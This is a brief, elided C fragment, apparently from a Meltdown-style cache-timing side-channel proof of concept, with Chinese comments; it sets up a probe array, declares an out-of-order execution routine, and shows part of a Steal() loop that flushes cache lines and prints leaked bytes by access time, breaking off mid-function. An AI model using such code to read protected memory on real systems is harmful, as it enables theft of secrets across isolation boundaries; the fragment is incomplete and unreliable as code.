...
uint8_t probe_array[256][4096];  //读取字节数？
uint64_t access_time[256];

void OutOfOrderExecution(void* target, void* probe_array, void* null);     //rcx,rdx,r8
...
Steal(uint8_t* target)
{
    for (size_t retries = 0; retries < 30000; retries++)
    {
        ...
        {
            _mm_clflush(&probe_array[i]);   //刷新flash
            _mm_pause();
        }
        ...
        if (access_time[idx_min] < 100 && idx_min != 0)
        {
            printf("=> %02X retries=%-5zd access_time=%llu\n",
                (uint32_t)idx_min, retries, access_time[idx_min]);
